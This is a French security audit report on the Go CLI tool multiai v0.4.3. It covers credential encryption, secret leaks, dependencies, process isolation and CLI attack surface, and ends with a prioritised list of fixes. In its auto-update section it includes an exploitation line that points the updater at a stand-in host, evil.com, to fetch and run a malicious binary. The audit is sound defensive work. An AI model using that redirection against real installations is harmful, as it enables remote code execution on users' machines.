# 🔐 AUDIT DE SÉCURITÉ COMPLET — multiai v0.4.3

**Date :** 2026-07-09
**Périmètre :** ~70 fichiers Go + packaging + CI/CD
**Méthodologie :** Analyse parallèle par 5 agents spécialisés
**Score global :** 7.0/10 (correct, améliorations nécessaires avant v0.5.0)

---

## SYNTHÈSE DES RISQUES

| # | Vulnérabilité | Niveau | Axe |
|---|--------------|--------|-----|
| C-1 | Clé API DeepSeek en clair sur le disque | **CRITICAL** | Fuites de secrets |
| C-2 | SSRF + RCE via auto-update (`MULTIAI_GITHUB_API_URL`) | **CRITICAL** | Surface CLI |
| C-3 | Exécution de commandes arbitraires via hook system | **CRITICAL** | Surface CLI |
| H-1 | `--allow-custom-command` contourne la whitelist | **HIGH** | Isolation processus |
| H-2 | `CLEAR_ENV=false` désactive toute isolation | **HIGH** | Isolation processus |
| H-3 | Clé maître AES à côté des ciphertexts (même FS) | **HIGH** | Credentials |
| H-4 | Stores natifs OS non implémentés (stubs) | **HIGH** | Credentials |
| H-5 | Absence de pre-commit hook / détecteur de secrets | **HIGH** | Fuites de secrets |
| H-6 | Injection `os.ExpandEnv` post-échappement dans hooks | **HIGH** | Credentials |
| M-1 | Whitelist env case-sensitive sous Windows | **MEDIUM** | Isolation processus |
| M-2 | Pas de timeout/context sur processus enfants | **MEDIUM** | Isolation processus |
| M-3 | `gopkg.in/yaml.v3` archivé, plus maintenu | **MEDIUM** | Dépendances |
| M-4 | Pas de zéroïsation mémoire complète des secrets | **MEDIUM** | Credentials |
| M-5 | `.env` à la racine du dépôt traqués dans git | **MEDIUM** | Fuites de secrets |
| M-6 | PKGBUILD avec `sha256sums=('SKIP')` | **MEDIUM** | Fuites de secrets |
| M-7 | Email personnel dans le code source public | **MEDIUM** | Fuites de secrets |

---

## 1. GESTION DES CREDENTIALS (AES-256-GCM, SENTINEL PATTERN)

### Niveau de risque : **MEDIUM** ⚠️

### Architecture

```
┌─────────────────────────────────────────────────────┐
│  Fichier .env                  Credential Store      │
│  ┌──────────────────┐         ┌──────────────────┐  │
│  │ ANTHROPIC_API_KEY │         │ .masterkey (32B) │  │
│  │ = __MULTIAI_     │────────▶│ multiai_ca.enc   │  │
│  │   CREDSTORE__    │ sentinel│ (AES-256-GCM)    │  │
│  └──────────────────┘         └──────────────────┘  │
│  permissions 0644              permissions 0600      │
└─────────────────────────────────────────────────────┘
```

### Forces ✅
- **Chiffrement AES-256-GCM** : stdlib Go uniquement, nonce aléatoire `crypto/rand`, écriture atomique (`fsutil.WriteFileAtomic`), zéroïsation partielle du plaintext après déchiffrement
- **Sentinel pattern robuste** : la constante `__MULTIAI_CREDSTORE__` remplace la vraie clé dans le `.env` ; invariant vérifié par test (`TestUpdateEnvFile_SentinelInvariant`)
- **Résolution bloquante** : si le store est indisponible → erreur, pas de dégradation silencieuse (corrigé depuis v0.4.0)
- **PBKDF2-HMAC-SHA256** implémenté dans `crypto.go` (fonction `DeriveKey`) — prêt à l'emploi

### Faiblesses ❌

| Faiblesse | Impact | Correction |
|-----------|--------|-----------|
| **Clé maître à côté du ciphertext** — `.masterkey` et `.enc` dans le même répertoire | Quiconque lit le FS déchiffre tout | Stores natifs OS (roadmap 1.10) |
| **Stores natifs OS = stubs vides** — Windows/macOS/Linux délèguent tous au fichier chiffré | Pas de liaison machine, pas de TPM/Secure Enclave/Keychain | Implémenter `wincred`, `SecItemAdd`, `libsecret` |
| **KDF non branché** — `DeriveKey()` existe mais n'est pas utilisé en production | Pas de protection par passphrase utilisateur | Activer PBKDF2 avec 600K+ itérations |
| **Zéroïsation incomplète** — seules les tranches `plaintext` sont effacées, `prof.Env` et `cmd.Env` persistent en mémoire | Secrets en clair dans la heap, core dumps, swap | Zéroïser après `cmd.Wait()`, envisager `memguard` |
| **`--allow-plaintext`** permet l'écriture en clair dans le `.env` | Dégradation silencieuse si l'utilisateur force le flag | Supprimer ou restreindre au mode dev |

### Recommandations prioritaires
1. **Implémenter les stores natifs OS** (Windows Credential Manager, macOS Keychain, libsecret) — c'est le correctif le plus impactant
2. **Activer le KDF** : brancher `DeriveKey()` avec une passphrase utilisateur et 600 000 itérations PBKDF2 (OWASP 2026)
3. **Zéroïser `prof.Env` et `cmd.Env`** après exécution du processus enfant

---

## 2. FUITES DE SECRETS DANS LE CODE

### Niveau de risque : **HIGH** 🔴

### Trouvaille critique

> **🔴 C-1 — Clé API DeepSeek en clair sur le disque**
>
> Fichier : `brainstorm laurent/clé deepseek ne pas mettre dans le repo.txt`
> Contenu : `***REMOVED-REVOKED-DEEPSEEK-CREDENTIAL***`
>
> Bien qu'ignoré par `.gitignore`, ce fichier pourrait être synchronisé par un backup cloud ou ajouté accidentellement avec `git add -f`.
>
> **Action immédiate :** Rotation de la clé sur platform.deepseek.com + suppression du fichier.

### État des lieux

| Vérification | Résultat |
|---|---|
| Clés API hardcodées dans le code source | ✅ Aucune — toutes les valeurs sont des placeholders `PASTE_*_HERE` |
| Clés API dans les tests | ✅ Aucune — toutes sont identifiablement factices (`-test-`, `-wizard-test-`) |
| Profils `.env` embarqués (38 fichiers) | ✅ Placeholders uniquement, vérifiés par `TestEmbeddedProfilesContainNoRealSecrets` |
| Scan pre-publication npm (`scan-secrets.js`) | ✅ Bloque la publication si clé réelle détectée |
| `.gitignore` | ✅ `*.env`, `.credentials/`, `brainstorm*` exclus |
| Détecteur automatique de secrets | ❌ **Aucun** — pas de gitleaks, pas de trufflehog, pas de pre-commit hook |
| Scan secrets dans CI | ❌ **Aucun** — `gosec` fait du SAST, pas de détection de secrets |
| Email personnel dans le code | ⚠️ `laurent@rochetta.fr` dans `.goreleaser.yaml`, `SECURITY.md`, `CODE_OF_CONDUCT.md` |

### Forces ✅
- **Scan pre-publication** : `scan-secrets.js` vérifie les templates avant publication npm
- **`.gitignore` bien configuré** : exclut `*.env`, sauf les templates embarqués vérifiés
- **Pas de vrais secrets dans git** : vérifié avec `git ls-files` et revue exhaustive des 38 profils
- **Masquage systématique** : `MaskSecret()` affiche `sk-a...f456`, jamais la clé complète

### Recommandations prioritaires
1. **Rotation immédiate** de la clé DeepSeek + suppression du fichier `brainstorm laurent/`
2. **Installer gitleaks** : `go install github.com/gitleaks/gitleaks/v8@latest` + `.gitleaks.toml` + pre-commit hook
3. **Ajouter un job CI** : `gitleaks detect` dans le workflow CI
4. **Remplacer l'email** par `laurent@users.noreply.github.com` dans `.goreleaser.yaml` et `CODE_OF_CONDUCT.md`

---

## 3. SÉCURITÉ DES DÉPENDANCES GO

### Niveau de risque : **LOW** ✅

### Surface de dépendances

```
Dépendances directes : 1 (gopkg.in/yaml.v3 v3.0.1)
Dépendances indirectes : 1 (gopkg.in/check.v1, transitive de test)
Total : 2 modules dans go.sum
```

C'est **exceptionnellement minimal** — un atout majeur pour la sécurité de la chaîne d'approvisionnement.

### Forces ✅
- **Empreinte minimale** : 1 dépendance directe, tout le reste est stdlib Go
- **CVE-2022-28948 corrigée** : la version `yaml.v3 v3.0.1` est la version patchée
- **CI complète** : `govulncheck`, `gosec`, `golangci-lint` exécutés à chaque push
- **Builds reproductibles** : `CGO_ENABLED=0`, `-trimpath`, `-s -w`, Cosign keyless signing
- **Actions pinées par SHA** : pas de `@v4` flottant
- **Dependabot actif** : scans hebdomadaires Go + GitHub Actions
- **`go mod verify`** : checksums go.sum intègres

### Faiblesses ⚠️

| Faiblesse | Impact | Correction |
|-----------|--------|-----------|
| **`gopkg.in/yaml.v3` archivé** (avril 2024) | Plus aucun correctif de sécurité futur | Migrer vers `github.com/yaml/go-yaml` (API compatible) |
| **Pas de SBOM dans la CI** (mentionné dans SECURITY.md) | Absence de traçabilité des composants | Ajouter `anchore/sbom-action` ou `syft` |
| **`go.mod` déclare `go 1.22`** | Version en fin de support | Mettre à jour vers go 1.24+ |

### Recommandations
1. **Migrer `gopkg.in/yaml.v3` → `github.com/yaml/go-yaml`** — changement mécanique (3 fichiers : `catalog.go`, `yaml.go`, `project.go`)
2. **Publier un SBOM** (CycloneDX ou SPDX) dans les releases GitHub
3. **Mettre à jour `go.mod`** vers go 1.24

---

## 4. ISOLATION DES PROCESSUS

### Niveau de risque : **HIGH** 🔴

### Architecture d'isolation

```
┌──────────────────────────────────────────────────────────┐
│  Processus multiai (parent)                              │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Whitelist commandes : claude, codex, opencode       │  │
│  │ Whitelist env : ~30 variables (PATH, HOME, ...)     │  │
│  │ Résolution sentinel → secret store                  │  │
│  │ Expansion %VAR% (profondeur max 10)                 │  │
│  └────────────────────────────────────────────────────┘  │
│                         │ exec.Command (sans shell)       │
│                         ▼                                 │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Processus enfant (Claude Code / Codex / OpenCode)   │  │
│  │ - Environnement filtré (si CLEAR_ENV=true)          │  │
│  │ - stdin/stdout/stderr hérités                       │  │
│  │ - Même groupe de processus (pas de SysProcAttr)      │  │
│  │ - Pas de timeout                                     │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────┘
```

### Forces ✅
- **`exec.Command` sans shell** : pas d'injection de commande directe
- **Descripteurs non hérités** : seuls stdin/stdout/stderr sont passés
- **Expansion %VAR% contrôlée** : profondeur max 10, seules les vars whitelistées sont résolues
- **Masquage systématique** : `MaskSecret()` dans l'affichage
- **Pas de secrets dans le journal** : `SessionEvent` conçu sans champs sensibles

### Faiblesses ❌

| ID | Faiblesse | Impact | Sévérité |
|----|-----------|--------|----------|
| **H-1** | `--allow-custom-command` contourne la whitelist sans validation | Exécution de n'importe quel binaire | **HIGH** |
| **H-2** | `CLEAR_ENV=false` transmet TOUT l'environnement parent | Exposition de SSH_AUTH_SOCK, tokens, clés | **HIGH** |
| **M-1** | Whitelist env **case-sensitive** sous Windows | `PATH` ou `SystemRoot` peuvent être supprimés | **MEDIUM** |
| **M-2** | Pas de `context.WithTimeout` sur `cmd.Wait()` | Blocage infini si l'enfant hang | **MEDIUM** |
| **E-1** | `MergeProjectConfig` utilise `os.ExpandEnv` (non whitelisté) | Expansion de toutes les vars système | **HIGH** |
| **E-2** | Hooks héritent de l'environnement complet du parent | Non filtré, contrairement au processus principal | **HIGH** |
| **B-1** | Pas de `SysProcAttr` (Setpgid, Pdeathsig) | Enfant dans le même groupe, pas de nettoyage si parent tué | **LOW** |

### Recommandations prioritaires
1. **Restreindre `--allow-custom-command`** : confirmation interactive ou interdiction en mode non-interactif
2. **Logger un warning sévère** quand `CLEAR_ENV=false` est utilisé
3. **Normaliser la whitelist env** : `strings.EqualFold` sous Windows, ajouter `APPDATA`, `LOCALAPPDATA`, `ProgramFiles`
4. **Ajouter `context.WithTimeout`** avec un timeout configurable (défaut 1h)
5. **Remplacer `os.ExpandEnv`** par `env.ExpandProfileEnv` dans `MergeProjectConfig`

---

## 5. SURFACE D'ATTAQUE DU CLI

### Niveau de risque : **HIGH** 🔴

### Vulnérabilités détectées

#### 🔴 CRITICAL — C-2 : SSRF + RCE via auto-update

```go
// update.go:96-107
apiURL := os.Getenv("MULTIAI_GITHUB_API_URL")  // ← contrôlable par l'utilisateur
if apiURL == "" {
    apiURL = fmt.Sprintf("https://api.github.com/repos/%s/releases/latest", repo)
}
```

Un attaquant qui contrôle `MULTIAI_GITHUB_API_URL` peut pointer vers un serveur malveillant qui renvoie une fausse release. Comme le binaire et `checksums.txt` sont téléchargés depuis le **même** serveur, la vérification SHA256 ne protège pas : l'attaquant sert un binaire malveillant avec son checksum légitime.

**Exploitation :** `MULTIAI_GITHUB_API_URL=https://evil.com/api multiai` → téléchargement et exécution du binaire malveillant via `os.StartProcess`.

#### 🔴 CRITICAL — C-3 : Exécution de commandes via hooks

Les hooks `before_launch`/`after_launch` sont exécutés via shell (`bash -c`, `powershell -Command`, `cmd /c`). Bien que `escapeShellArg` soit appliqué, l'ordre des opérations (template → `os.ExpandEnv` → `escapeShellArg`) laisse une fenêtre si des champs de profil contiennent des métacaractères. Le code est **dormant** (hooks non activés dans `runLaunch()`) mais présent.

### Forces ✅
- **Écritures atomiques** systématiques via `fsutil.WriteFileAtomic`
- **Taille YAML limitée** à 1 Mo (protection billion laughs)
- **Chemins relatifs CWD bloqués** par défaut (`MULTIAI_DEV` requis)
- **Extraction ZIP protégée** contre le zip-slip (`filepath.Base` + destination fixe)
- **Validation de commande par whitelist** en mode normal
- **`strip` + `-trimpath`** : pas de chemins de build dans le binaire

### Recommandations prioritaires
1. **Hardcoder l'URL de l'API GitHub** ou la restreindre à `api.github.com` uniquement — ne pas la rendre surchargeable
2. **Vérifier la signature GPG/Cosign** de `checksums.txt` avant de vérifier le SHA256 du binaire
3. **Activer les hooks uniquement avec `--allow-hooks`** explicite (flag gate)
4. **Valider les URLs de téléchargement** : restreindre aux domaines `github.com` et `github-releases.githubusercontent.com`

---

## TABLEAU DE BORD — CORRECTIFS PRIORISÉS

### 🔴 Immédiat (cette semaine)

| # | Action | Axe |
|---|--------|-----|
| 1 | Rotation clé DeepSeek + suppression `brainstorm laurent/` | Fuites |
| 2 | Hardcoder ou restreindre `MULTIAI_GITHUB_API_URL` à `api.github.com` | CLI |
| 3 | Ajouter vérification de signature sur l'auto-update (Cosign/GPG) | CLI |
| 4 | Installer gitleaks + pre-commit hook + job CI | Fuites |

### 🟠 Haute priorité (avant v0.5.0)

| # | Action | Axe |
|---|--------|-----|
| 5 | Implémenter les stores natifs OS (Credential Manager, Keychain, libsecret) | Credentials |
| 6 | Activer le KDF (PBKDF2 600K itérations) avec passphrase utilisateur | Credentials |
| 7 | Restreindre `--allow-custom-command` (confirmation interactive ou refus non-TTY) | Isolation |
| 8 | Remplacer `os.ExpandEnv` par `ExpandProfileEnv` dans `MergeProjectConfig` | Isolation |
| 9 | Corriger la case-sensitivity de la whitelist env sous Windows | Isolation |
| 10 | Ajouter `context.WithTimeout` sur les processus enfants | Isolation |

### 🟡 Priorité moyenne (v0.6.0)

| # | Action | Axe |
|---|--------|-----|
| 11 | Migrer `gopkg.in/yaml.v3` → `github.com/yaml/go-yaml` | Dépendances |
| 12 | Zéroïser `prof.Env` et `cmd.Env` après exécution | Credentials |
| 13 | Logger un warning si `CLEAR_ENV=false` | Isolation |
| 14 | Dé-traquer les 3 `.env` de la racine du dépôt | Fuites |
| 15 | Ajouter `go mod verify` dans la CI | Dépendances |
| 16 | Publier un SBOM (CycloneDX) dans les releases | Dépendances |

### 🟢 Priorité basse (backlog)

| # | Action | Axe |
|---|--------|-----|
| 17 | Ajouter `SysProcAttr` (Setpgid, Pdeathsig) | Isolation |
| 18 | Remplacer `sha256sums=('SKIP')` par vrai checksum dans PKGBUILD | Fuites |
| 19 | Remplacer email par `noreply.github.com` dans le code public | Fuites |
| 20 | Mettre à jour `go.mod` vers go 1.24 | Dépendances |

---

## CONCLUSION

Le projet **multiai v0.4.3** présente une architecture de sécurité **globalement saine** pour un outil de cette maturité (~3 semaines de développement). Les choix fondamentaux sont bons :

- **AES-256-GCM** sans dépendance externe, écritures atomiques
- **Sentinel pattern** avec invariants vérifiés par tests
- **1 seule dépendance Go** — surface d'attaque minimale
- **Masquage systématique** des secrets dans l'affichage
- **Journal de sessions** conçu sans champs sensibles
- **CI complète** : gosec, govulncheck, Dependabot, Cosign

Les **deux risques majeurs** à corriger en priorité sont :

1. **L'auto-update** qui peut être détourné via `MULTIAI_GITHUB_API_URL` → RCE
2. **La clé maître AES** stockée à côté des ciphertexts → pas de protection réelle contre un accès disque

Une fois les correctifs 🔴 et 🟠 appliqués, le projet pourra viser un score de **8.5/10** pour la release v0.5.0.
